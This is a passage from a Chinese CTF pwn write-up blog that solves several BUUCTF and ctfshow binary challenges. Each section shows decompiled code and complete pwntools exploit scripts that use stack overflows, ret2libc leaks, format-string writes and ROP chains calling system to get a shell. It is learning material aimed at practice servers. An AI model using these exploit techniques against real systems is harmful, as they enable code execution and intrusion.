<p>所以flag地址为flag_addr&#x3D;0x80ECA2D<br>想要把flag输出，可以用printf、puts，我尝试了printf，但是没有成功，后来看了wp，都是用的write<br>改成用write<br>write有三个参数，一个是文件描述符（0，1，2)，数据的地址，写入的长度。<br>第一个参数设置为1，代表输出流<br>栈结构不看了，多大都能溢出，还有看的结构里发现不用多溢出4，汇编显示最后没有用到ebp<br>payload我写了俩</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2d</span>+p32(get_secret)+p32(main_addr)</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2d</span>+p32(write_addr)+p32(<span class="number">0</span>)+p32(<span class="number">1</span>)+p32(flag_addr)+p32(<span class="number">45</span>)</span><br><span class="line"><span class="comment">#第二个payload中，0是返回地址，45是根据get_secret()函数中可以得知flag长度为45</span></span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28754</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./not_the_same_3dsctf_2016&#x27;</span>)</span><br><span class="line">get_secrec=<span class="number">0x80489A0</span></span><br><span class="line">flag_addr=<span class="number">0x80ECA2D</span></span><br><span class="line">write_addr=elf.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2d</span>+p32(get_secrec)+p32(main_addr)</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2d</span>+p32(write_addr)+p32(<span class="number">0</span>)+p32(<span class="number">1</span>)+p32(flag_addr)+p32(<span class="number">45</span>)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="ctfshow-pwn07"><a href="#ctfshow-pwn07" class="headerlink" title="ctfshow_pwn07"></a>ctfshow_pwn07</h1><p>checksec</p>
<img src="/yw/259342972/pwn07_1.png" class>

<p>32位，堆栈不可执行</p>
<p>ida</p>
<p>main函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *v3; <span class="comment">// rdi</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  v3 = _bss_start;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  welcome(v3);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>welcome函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">welcome</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">12</span>]; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>welcome函数栈结构</p>


<p>没有system和binsh，本题是ret2libc</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28144</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi=<span class="number">0x4006e3</span></span><br><span class="line">ret=<span class="number">0x4004c6</span></span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xc</span>+<span class="number">0x8</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">puts_addr=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libcbase=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=libcbase+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">str_bin_sh=libcbase+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xc</span>+<span class="number">8</span>)+p64(ret)+p64(pop_rdi)+p64(str_bin_sh)+p64(system)+p64(<span class="number">0</span>)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="不解的地方"><a href="#不解的地方" class="headerlink" title="不解的地方"></a>不解的地方</h2><p>在接收puts的地址的时候，为什么是6位，尝试8位，是打不通的</p>
<h1 id="ctfshow-pwn10"><a href="#ctfshow-pwn10" class="headerlink" title="ctfshow_pwn10"></a>ctfshow_pwn10</h1><h2 id="查看安全策略和反汇编"><a href="#查看安全策略和反汇编" class="headerlink" title="查看安全策略和反汇编"></a>查看安全策略和反汇编</h2><p>checksec</p>
<img src="/yw/259342972/pwn10_1.png" class>

<p>ida</p>
<p>main函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bad sp value at call has been detected, the output may be wrong!</span></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp-14h] [ebp-80h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp-10h] [ebp-7Ch]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp-Ch] [ebp-78h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp-8h] [ebp-74h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp-4h] [ebp-70h]</span></span><br><span class="line">  <span class="type">char</span> format[<span class="number">100</span>]; <span class="comment">// [esp+0h] [ebp-6Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> *p_argc; <span class="comment">// [esp+64h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  p_argc = &amp;argc;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;try pwn me?&quot;</span>);</span><br><span class="line">  ((<span class="type">void</span> (__stdcall *)(<span class="type">const</span> <span class="type">char</span> *, <span class="type">char</span> *, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>))__isoc99_scanf)(<span class="string">&quot;%s&quot;</span>, format, v4, v5, v6, v7, v8);</span><br><span class="line">  <span class="built_in">printf</span>(format);</span><br><span class="line">  <span class="keyword">if</span> ( num == <span class="number">16</span> )</span><br><span class="line">    system(<span class="string">&quot;cat flag&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(aYouMayNeedToKe);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>num的位置</p>
<img src="/yw/259342972/pwn10_2.png" class>

<p>num&#x3D;0x804A030</p>
<p>主函数中有格式化字符串漏洞，可以利用修改num处的值为16从而拿到flag</p>
<p>运行找偏移</p>
<img src="/yw/259342972/pwn10_3.png" class>

<p>a的ascii是61，可以看出偏移是7</p>
<p>所以</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=p32(num)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">12</span>+<span class="string">b&#x27;%7$n&#x27;</span></span><br></pre></td></tr></table></figure>

<p>32位嘛，地址长度是四字节，在加上12就是需要的16了</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28200</span>)</span><br><span class="line">num=<span class="number">0x0804A030</span></span><br><span class="line">payload=p32(num)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">12</span>+<span class="string">b&#x27;%7$n&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="buuctf-ciscn-2019-ne-5"><a href="#buuctf-ciscn-2019-ne-5" class="headerlink" title="buuctf_ciscn_2019_ne_5"></a>buuctf_ciscn_2019_ne_5</h1><h2 id="查看安全策略和反汇编-1"><a href="#查看安全策略和反汇编-1" class="headerlink" title="查看安全策略和反汇编"></a>查看安全策略和反汇编</h2><p>checksec</p>
<img src="/yw/259342972/ciscn_2019_ne_5_1.png" class>

<p>32位堆栈不可执行</p>
<p>ida</p>
<p>main</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+0h] [ebp-100h] BYREF</span></span><br><span class="line">  <span class="type">char</span> src[<span class="number">4</span>]; <span class="comment">// [esp+4h] [ebp-FCh] BYREF</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">124</span>]; <span class="comment">// [esp+8h] [ebp-F8h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s1[<span class="number">4</span>]; <span class="comment">// [esp+84h] [ebp-7Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">96</span>]; <span class="comment">// [esp+88h] [ebp-78h] BYREF</span></span><br><span class="line">  <span class="type">int</span> *p_argc; <span class="comment">// [esp+F4h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  p_argc = &amp;argc;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  *(_DWORD *)s1 = <span class="number">48</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v8, <span class="number">0</span>, <span class="keyword">sizeof</span>(v8));</span><br><span class="line">  *(_DWORD *)src = <span class="number">48</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="keyword">sizeof</span>(v6));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to use LFS.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input admin password:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%100s&quot;</span>, s1);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s1, <span class="string">&quot;administrator&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Password Error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your operation:&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.Add a log.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.Display all logs.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.Print all logs.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;0.Exit\n:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">switch</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      AddLog(src);</span><br><span class="line">      result = sub_804892B(argc, argv, envp);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      Display(src);</span><br><span class="line">      result = sub_804892B(argc, argv, envp);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      Print();</span><br><span class="line">      result = sub_804892B(argc, argv, envp);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      GetFlag(src);</span><br><span class="line">      result = sub_804892B(argc, argv, envp);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      result = sub_804892B(argc, argv, envp);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看字符串窗口</p>
<img src="/yw/259342972/ciscn_2019_ne_5_2.png" class>

<p>看到flag字样，跟进后</p>
<p>GetFlag函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">GetFlag</span><span class="params">(<span class="type">char</span> *src)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">4</span>]; <span class="comment">// [esp+0h] [ebp-48h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">60</span>]; <span class="comment">// [esp+4h] [ebp-44h] BYREF</span></span><br><span class="line"></span><br><span class="line">  *(_DWORD *)dest = <span class="number">48</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v3, <span class="number">0</span>, <span class="keyword">sizeof</span>(v3));</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;The flag is your log:%s\n&quot;</span>, dest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>提示在log，找到有关log</p>
<p>addlog函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">AddLog</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input new log info:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __isoc99_scanf(<span class="string">&quot;%128s&quot;</span>, a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以输入128字节，通过addlog函数给src写payload</p>
<p>再调用getflag函数，将src复制到dest，造成栈溢出，可以拿到shell</p>
<p>有了system还差&#x2F;bin&#x2F;sh，虽然没法直接找到&#x2F;bin&#x2F;sh的gadget，但是找到了sh的gadget</p>
<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26921</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./ciscn_2019_ne_5&#x27;)</span></span><br><span class="line">str_sh=<span class="number">0x080482ea</span></span><br><span class="line">system=<span class="number">0x80484D0</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;password:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;administrator&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;info:&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4c</span>+p32(system)+<span class="string">b&#x27;0000&#x27;</span>+p32(str_sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="第四周"><a href="#第四周" class="headerlink" title="第四周"></a>第四周</h1><h1 id="buuctf-铁人三项-第五赛区-2018-rop"><a href="#buuctf-铁人三项-第五赛区-2018-rop" class="headerlink" title="buuctf_铁人三项(第五赛区)_2018_rop"></a>buuctf_铁人三项(第五赛区)_2018_rop</h1><p>checksec</p>
<img src="/yw/259342972/%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9(%E7%AC%AC%E4%BA%94%E8%B5%9B%E5%8C%BA)_2018_rop_1.png" class>
<p>32位堆栈不可执行<br>ida<br>main</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  be_nice_to_people();</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">0xD</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>vulnerable_function</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">136</span>]; <span class="comment">// [esp+10h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没有后门函数<br>ret2libc<br>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27557</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./2018_rop&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./2018_rop&#x27;</span>)</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">vulnerable_function_addr=elf.sym[<span class="string">&#x27;vulnerable_function&#x27;</span>]</span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">136</span>+<span class="number">4</span>)+p32(write_plt)+p32(vulnerable_function_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">0x4</span>)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line"><span class="comment">#io.recvuntil(b&#x27;World\n&#x27;)</span></span><br><span class="line">write_addr=u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libcbase=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system=libcbase+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">str_bin_sh=libcbase+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">136</span>+<span class="number">4</span>)+p32(system)+<span class="string">b&#x27;1234&#x27;</span>+p32(str_bin_sh)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="buuctf-bjdctf-2020-babyrop"><a href="#buuctf-bjdctf-2020-babyrop" class="headerlink" title="buuctf_bjdctf_2020_babyrop"></a>buuctf_bjdctf_2020_babyrop</h1><p>checksec</p>
<img src="/yw/259342972/bjdctf_2020_babyrop_1.png" class>
<p>64位，堆栈不可执行<br>ida<br>main</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>init</p>
